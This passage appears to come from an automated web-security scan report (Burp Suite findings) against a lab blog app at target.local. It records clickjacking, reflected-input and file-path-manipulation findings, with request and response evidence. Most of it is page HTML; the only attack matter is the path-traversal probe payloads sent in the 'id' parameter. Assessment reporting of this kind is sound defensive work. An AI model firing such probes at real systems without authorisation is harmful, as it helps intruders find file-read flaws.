+        &lt;div class=&quot;d-flex justify-content-between w-100&quot;&gt;
+            &lt;!-- Left side with &quot;Encoder64 Blog&quot; --&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;/index.php&quot;&gt;Encoder64 Blog&lt;/a&gt;
+
+            &lt;!-- Right side with navigation links and toggler button --&gt;
+            &lt;div&gt;
+                &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNavAltMarkup&quot; aria-controls=&quot;navbarNavAltMarkup&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                    &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+                &lt;/button&gt;
+                &lt;div class=&quot;collapse navbar-collapse justify-content-end&quot; id=&quot;navbarNavAltMarkup&quot;&gt;
+                    &lt;div class=&quot;navbar-nav&quot;&gt;
+                        &lt;a class=&quot;nav-link active&quot; aria-current=&quot;page&quot; href=&quot;/index.php&quot;&gt;Home&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/about.php&quot;&gt;About&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/contact.php&quot;&gt;Contact&lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/nav&gt;
+
+    &lt;!-- Header with Featured Post --&gt;
+    &lt;header class=&quot;py-5 bg-light border-bottom mb-4&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;div class=&quot;text-center my-5&quot;&gt;
+                &lt;h1 class=&quot;fw-bolder&quot;&gt;Submit Your Article&lt;/h1&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/header&gt;
+
+    &lt;!-- Main Content Section --&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;div class=&quot;col-md-8&quot;&gt;
+                &lt;div class=&quot;container mt-5&quot;&gt;
+                                        &lt;p&gt;Please fill in this form to submit your article.&lt;/p&gt;
+                    &lt;form action=&quot;/posts/upload-article.php/8xst2g0x6k&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+                        &lt;div class=&quot;form-group&quot;&gt;
+                            &lt;label&gt;Name&lt;/label&gt;
+                            &lt;input type=&quot;text&quot; name=&quot;name&quot; class=&quot;form-control&quot; value=&quot;&quot;&gt;
+                            &lt;span class=&quot;error&quot;&gt;&lt;/span&gt;
+                        &lt;/div&gt;    
+                        &lt;div class=&quot;form-group&quot;&gt;
+                            &lt;label&gt;Email&lt;/label&gt;
+                            &lt;input type=&quot;email&quot; name=&quot;email&quot; class=&quot;form-control&quot; value=&quot;&quot;&gt;
+                            &lt;span class=&quot;error&quot;&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                        &lt;div class=&quot;form-group&quot;&gt;
+                            &lt;label&gt;Upload Article&lt;/label&gt;
+                            &lt;input type=&quot;file&quot; name=&quot;articleFile&quot; class=&quot;form-control&quot;&gt;
+                            &lt;span class=&quot;error&quot;&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                        &lt;div class=&quot;form-group&quot;&gt;
+                            &lt;input type=&quot;submit&quot; class=&quot;btn btn-primary&quot; value=&quot;Submit&quot;&gt;
+                        &lt;/div&gt;
+                    &lt;/form&gt;
+                                    &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;!-- Sidebar Widgets Column --&gt;
+        &lt;div class=&quot;col-md-4&quot;&gt;
+    &lt;!-- Search Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Search&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;input-group&quot;&gt;
+                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;Search for...&quot;&gt;
+                &lt;span class=&quot;input-group-append&quot;&gt;
+                    &lt;button class=&quot;btn btn-secondary&quot; type=&quot;button&quot;&gt;Go!&lt;/button&gt;
+                &lt;/span&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Categories Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Categories&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;row&quot;&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Web Design&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;HTML&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Freebies&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;CSS&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Tutorials&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Side Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Live Visitors&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;h6&gt;Current Live Visitors: &lt;span id=&quot;visitorCount&quot;&gt;0&lt;/span&gt;&lt;/h6&gt;
+            &lt;p&gt;Top Countries:&lt;/p&gt;
+            &lt;ul id=&quot;visitorCountries&quot;&gt;
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Help wanted!&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;h6&gt;Help us improving the articles of the blog&lt;/h6&gt;
+            &lt;p&gt;Submit yours &lt;a href=&quot;posts/upload-article.php&quot;&gt;here!&lt;/a&gt;&lt;/p&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+    document.addEventListener('DOMContentLoaded', function() {
+        const countries = [&quot;Argentina&quot;, &quot;Poland&quot;, &quot;USA&quot;, &quot;Canada&quot;, &quot;Brazil&quot;, &quot;India&quot;, &quot;Germany&quot;, &quot;France&quot;, &quot;Australia&quot;, &quot;Japan&quot;, &quot;South Korea&quot;, &quot;South Africa&quot;];
+        
+        function updateVisitors() {
+            const visitorCount = Math.floor(Math.random() * 500) + 100;
+            document.getElementById('visitorCount').innerText = visitorCount;
+            const selectedCountries = [];
+            for (let i = 0; i &lt; 3; i++) {
+                const index = Math.floor(Math.random() * countries.length);
+                if (!selectedCountries.includes(countries[index])) {
+                    selectedCountries.push(countries[index]);
+                }
+            }
+            const ul = document.getElementById('visitorCountries');
+            ul.innerHTML = &quot;&quot;;
+            selectedCountries.forEach(country =&gt; {
+                const li = document.createElement('li');
+                li.innerText = country;
+                ul.appendChild(li);
+            });
+        }
+        updateVisitors();
+        setInterval(updateVisitors, 5000);
+    });
+&lt;/script&gt;    &lt;/div&gt;
+
+    &lt;!-- Bootstrap core JavaScript --&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-8">
+<h3><span class="badge" style="background:#5f7d8c">INFO</span> 8. [burp] Frameable response (potential Clickjacking)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">(confidence: FIRM) @ http://target.local:32807/about.php</div>
+<div><b>Reproduction</b></div><pre>Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxqqpb1-5v</code> — <code>artifacts/_/ev-mqxqqpb1-5v/</code></div><div class="lbl">REQUEST</div><pre>GET /about.php HTTP/1.1
+Host: target.local:32807
+
+GET /about.php HTTP/1.1
+Host: target.local:32807
+Accept: */*</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/1.1 200 OK
+Date: Sun, 28 Jun 2026 12:02:30 GMT
+Server: Apache/2.4.54 (Debian)
+X-Powered-By: PHP/7.4.33
+Vary: Accept-Encoding
+Content-Length: 7636
+Content-Type: text/html; charset=UTF-8
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF8&quot;&gt;
+    &lt;title&gt;Encoder64 Blog | About&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;!-- Navigation Bar --&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;!-- Navbar content split into two halves with flexbox --&gt;
+        &lt;div class=&quot;d-flex justify-content-between w-100&quot;&gt;
+            &lt;!-- Left side with &quot;Encoder64 Blog&quot; --&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;/index.php&quot;&gt;Encoder64 Blog&lt;/a&gt;
+
+            &lt;!-- Right side with navigation links and toggler button --&gt;
+            &lt;div&gt;
+                &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNavAltMarkup&quot; aria-controls=&quot;navbarNavAltMarkup&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                    &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+                &lt;/button&gt;
+                &lt;div class=&quot;collapse navbar-collapse justify-content-end&quot; id=&quot;navbarNavAltMarkup&quot;&gt;
+                    &lt;div class=&quot;navbar-nav&quot;&gt;
+                        &lt;a class=&quot;nav-link active&quot; aria-current=&quot;page&quot; href=&quot;/index.php&quot;&gt;Home&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/about.php&quot;&gt;About&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/contact.php&quot;&gt;Contact&lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/nav&gt;
+
+    &lt;!-- Header with Featured Post --&gt;
+    &lt;header class=&quot;py-5 bg-light border-bottom mb-4&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;div class=&quot;text-center my-5&quot;&gt;
+                &lt;h1 class=&quot;fw-bolder&quot;&gt;About me!&lt;/h1&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/header&gt;
+
+    &lt;!-- Main Content Section --&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;div class=&quot;col-md-8&quot;&gt;
+                &lt;div class=&quot;container mt-5&quot;&gt;
+                    &lt;h1&gt;Meet Encoder64: Master of Digital Realms&lt;/h1&gt;
+                    &lt;p&gt;
+                        In the shadows of the digital world, there exists a figure both revered and feared. Known only as Encoder64, this enigmatic entity commands the cyber landscape with unparalleled skill. With a knack for breaking through digital barriers that seem impregnable to most, Encoder64 has shaped the contours of cyber security and ethical hacking.
+                    &lt;/p&gt;
+
+                    &lt;h2&gt;The Myth, The Legend&lt;/h2&gt;
+                    &lt;p&gt;
+                        Encoder64's journey began in the early days of internet exploration. Known for utilizing advanced encryption techniques and sophisticated algorithms, Encoder64 can infiltrate seemingly secure networks with the grace of a digital phantom. This mystic skill set not only showcases an extraordinary proficiency in programming but also an inventive approach to problem-solving in the cybernetic world.
+                    &lt;/p&gt;
+
+                    &lt;h2&gt;Philosophy of a Hacker&lt;/h2&gt;
+                    &lt;p&gt;
+                        Far from the nefarious deeds often associated with hackers, Encoder64 operates under a strict code of ethics, advocating for transparency and privacy. This philosophy is driven by a belief that information should be free and that privacy is a fundamental right, not a privilege.
+                    &lt;/p&gt;
+
+                    &lt;h2&gt;Techniques and Triumphs&lt;/h2&gt;
+                    &lt;p&gt;
+                        Encoder64 is a master of both offensive and defensive cyber strategies. From deploying intricate DDoS defenses to unmasking vulnerabilities in popular software, Encoder64's exploits are a testament to their deep understanding of the digital domain. Their work has prevented numerous cyber attacks, saving countless data from potential exploitation.
+                    &lt;/p&gt;
+
+                    &lt;h2&gt;Legacy and Future&lt;/h2&gt;
+                    &lt;p&gt;
+                        As digital landscapes evolve, so too does the legend of Encoder64. Constantly adapting and learning, Encoder64 remains at the forefront of cybersecurity discussions, inspiring both fear and admiration. Their ongoing mission: to challenge the status quo and push the boundaries of what is possible in cybersecurity.
+                    &lt;/p&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;!-- Sidebar Widgets Column --&gt;
+            &lt;div class=&quot;col-md-4&quot;&gt;
+    &lt;!-- Search Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Search&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;input-group&quot;&gt;
+                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;Search for...&quot;&gt;
+                &lt;span class=&quot;input-group-append&quot;&gt;
+                    &lt;button class=&quot;btn btn-secondary&quot; type=&quot;button&quot;&gt;Go!&lt;/button&gt;
+                &lt;/span&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Categories Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Categories&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;row&quot;&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Web Design&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;HTML&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Freebies&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;CSS&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Tutorials&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Side Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Live Visitors&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;h6&gt;Current Live Visitors: &lt;span id=&quot;visitorCount&quot;&gt;0&lt;/span&gt;&lt;/h6&gt;
+            &lt;p&gt;Top Countries:&lt;/p&gt;
+            &lt;ul id=&quot;visitorCountries&quot;&gt;
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Help wanted!&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;h6&gt;Help us improving the articles of the blog&lt;/h6&gt;
+            &lt;p&gt;Submit yours &lt;a href=&quot;posts/upload-article.php&quot;&gt;here!&lt;/a&gt;&lt;/p&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+    document.addEventListener('DOMContentLoaded', function() {
+        const countries = [&quot;Argentina&quot;, &quot;Poland&quot;, &quot;USA&quot;, &quot;Canada&quot;, &quot;Brazil&quot;, &quot;India&quot;, &quot;Germany&quot;, &quot;France&quot;, &quot;Australia&quot;, &quot;Japan&quot;, &quot;South Korea&quot;, &quot;South Africa&quot;];
+        
+        function updateVisitors() {
+            const visitorCount = Math.floor(Math.random() * 500) + 100;
+            document.getElementById('visitorCount').innerText = visitorCount;
+            const selectedCountries = [];
+            for (let i = 0; i &lt; 3; i++) {
+                const index = Math.floor(Math.random() * countries.length);
+                if (!selectedCountries.includes(countries[index])) {
+                    selectedCountries.push(countries[index]);
+                }
+            }
+            const ul = document.getElementById('visitorCountries');
+            ul.innerHTML = &quot;&quot;;
+            selectedCountries.forEach(country =&gt; {
+                const li = document.createElement('li');
+                li.innerText = country;
+                ul.appendChild(li);
+            });
+        }
+        updateVisitors();
+        setInterval(updateVisitors, 5000);
+    });
+&lt;/script&gt;        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap core JavaScript --&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-9">
+<h3><span class="badge" style="background:#5f7d8c">INFO</span> 9. [burp] Input returned in response (reflected) (2 URLs)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">The name of an arbitrarily supplied URL parameter is copied into the application's response. (confidence: CERTAIN) [+1 more URL(s): http://target.local:32807/contact.php] @ http://target.local:32807/posts/upload-article.php</div>
+<div><b>Reproduction</b></div><pre>Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxqqpb8-5w</code> — <code>artifacts/_/ev-mqxqqpb8-5w/</code></div><div class="lbl">REQUEST</div><pre>GET /posts/upload-article.php HTTP/1.1
+Host: target.local:32807
+
+GET /posts/upload-article.php/8xst2g0x6k HTTP/1.1
+Host: target.local:32807
+Accept: */*</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/1.1 200 OK
+Date: Sun, 28 Jun 2026 12:02:35 GMT
+Server: Apache/2.4.54 (Debian)
+X-Powered-By: PHP/7.4.33
+Vary: Accept-Encoding
+Content-Length: 6582
+Content-Type: text/html; charset=UTF-8
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF8&quot;&gt;
+    &lt;title&gt;Encoder64 Blog | Article Submission&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;!-- Navigation Bar --&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;!-- Navbar content split into two halves with flexbox --&gt;
+        &lt;div class=&quot;d-flex justify-content-between w-100&quot;&gt;
+            &lt;!-- Left side with &quot;Encoder64 Blog&quot; --&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;/index.php&quot;&gt;Encoder64 Blog&lt;/a&gt;
+
+            &lt;!-- Right side with navigation links and toggler button --&gt;
+            &lt;div&gt;
+                &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNavAltMarkup&quot; aria-controls=&quot;navbarNavAltMarkup&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                    &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+                &lt;/button&gt;
+                &lt;div class=&quot;collapse navbar-collapse justify-content-end&quot; id=&quot;navbarNavAltMarkup&quot;&gt;
+                    &lt;div class=&quot;navbar-nav&quot;&gt;
+                        &lt;a class=&quot;nav-link active&quot; aria-current=&quot;page&quot; href=&quot;/index.php&quot;&gt;Home&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/about.php&quot;&gt;About&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/contact.php&quot;&gt;Contact&lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/nav&gt;
+
+    &lt;!-- Header with Featured Post --&gt;
+    &lt;header class=&quot;py-5 bg-light border-bottom mb-4&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;div class=&quot;text-center my-5&quot;&gt;
+                &lt;h1 class=&quot;fw-bolder&quot;&gt;Submit Your Article&lt;/h1&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/header&gt;
+
+    &lt;!-- Main Content Section --&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;div class=&quot;col-md-8&quot;&gt;
+                &lt;div class=&quot;container mt-5&quot;&gt;
+                                        &lt;p&gt;Please fill in this form to submit your article.&lt;/p&gt;
+                    &lt;form action=&quot;/posts/upload-article.php/8xst2g0x6k&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+                        &lt;div class=&quot;form-group&quot;&gt;
+                            &lt;label&gt;Name&lt;/label&gt;
+                            &lt;input type=&quot;text&quot; name=&quot;name&quot; class=&quot;form-control&quot; value=&quot;&quot;&gt;
+                            &lt;span class=&quot;error&quot;&gt;&lt;/span&gt;
+                        &lt;/div&gt;    
+                        &lt;div class=&quot;form-group&quot;&gt;
+                            &lt;label&gt;Email&lt;/label&gt;
+                            &lt;input type=&quot;email&quot; name=&quot;email&quot; class=&quot;form-control&quot; value=&quot;&quot;&gt;
+                            &lt;span class=&quot;error&quot;&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                        &lt;div class=&quot;form-group&quot;&gt;
+                            &lt;label&gt;Upload Article&lt;/label&gt;
+                            &lt;input type=&quot;file&quot; name=&quot;articleFile&quot; class=&quot;form-control&quot;&gt;
+                            &lt;span class=&quot;error&quot;&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                        &lt;div class=&quot;form-group&quot;&gt;
+                            &lt;input type=&quot;submit&quot; class=&quot;btn btn-primary&quot; value=&quot;Submit&quot;&gt;
+                        &lt;/div&gt;
+                    &lt;/form&gt;
+                                    &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;!-- Sidebar Widgets Column --&gt;
+        &lt;div class=&quot;col-md-4&quot;&gt;
+    &lt;!-- Search Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Search&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;input-group&quot;&gt;
+                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;Search for...&quot;&gt;
+                &lt;span class=&quot;input-group-append&quot;&gt;
+                    &lt;button class=&quot;btn btn-secondary&quot; type=&quot;button&quot;&gt;Go!&lt;/button&gt;
+                &lt;/span&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Categories Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Categories&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;row&quot;&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Web Design&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;HTML&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Freebies&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;CSS&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Tutorials&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Side Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Live Visitors&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;h6&gt;Current Live Visitors: &lt;span id=&quot;visitorCount&quot;&gt;0&lt;/span&gt;&lt;/h6&gt;
+            &lt;p&gt;Top Countries:&lt;/p&gt;
+            &lt;ul id=&quot;visitorCountries&quot;&gt;
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Help wanted!&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;h6&gt;Help us improving the articles of the blog&lt;/h6&gt;
+            &lt;p&gt;Submit yours &lt;a href=&quot;posts/upload-article.php&quot;&gt;here!&lt;/a&gt;&lt;/p&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+    document.addEventListener('DOMContentLoaded', function() {
+        const countries = [&quot;Argentina&quot;, &quot;Poland&quot;, &quot;USA&quot;, &quot;Canada&quot;, &quot;Brazil&quot;, &quot;India&quot;, &quot;Germany&quot;, &quot;France&quot;, &quot;Australia&quot;, &quot;Japan&quot;, &quot;South Korea&quot;, &quot;South Africa&quot;];
+        
+        function updateVisitors() {
+            const visitorCount = Math.floor(Math.random() * 500) + 100;
+            document.getElementById('visitorCount').innerText = visitorCount;
+            const selectedCountries = [];
+            for (let i = 0; i &lt; 3; i++) {
+                const index = Math.floor(Math.random() * countries.length);
+                if (!selectedCountries.includes(countries[index])) {
+                    selectedCountries.push(countries[index]);
+                }
+            }
+            const ul = document.getElementById('visitorCountries');
+            ul.innerHTML = &quot;&quot;;
+            selectedCountries.forEach(country =&gt; {
+                const li = document.createElement('li');
+                li.innerText = country;
+                ul.appendChild(li);
+            });
+        }
+        updateVisitors();
+        setInterval(updateVisitors, 5000);
+    });
+&lt;/script&gt;    &lt;/div&gt;
+
+    &lt;!-- Bootstrap core JavaScript --&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-10">
+<h3><span class="badge" style="background:#5f7d8c">INFO</span> 10. [burp] File path manipulation</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">The &lt;b&gt;id&lt;/b&gt; parameter appears to be vulnerable to file path manipulation attacks. &lt;br&gt;&lt;br&gt;The payload &lt;b&gt;./ScriptKiddie-v2&lt;/b&gt; was submitted in the id parameter. This returned the same content as the base request. The payload &lt;b&gt;.../ScriptKiddie-v2&lt;/b&gt; was then submitted, and this returned a different response. This indicates that the application may be vulnerable to file path manipulation. (confidence: TENTATIVE) @ http://target.local:32807/post.php</div>
+<div><b>Reproduction</b></div><pre>Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxqqpbj-5y</code> — <code>artifacts/_/ev-mqxqqpbj-5y/</code></div><div class="lbl">REQUEST</div><pre>GET /post.php HTTP/1.1
+Host: target.local:32807
+
+GET /post.php?id=.%2fScriptKiddie-v2 HTTP/1.1
+Host: target.local:32807
+Accept: */*</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/1.1 200 OK
+Date: Sun, 28 Jun 2026 12:03:35 GMT
+Server: Apache/2.4.54 (Debian)
+X-Powered-By: PHP/7.4.33
+Vary: Accept-Encoding
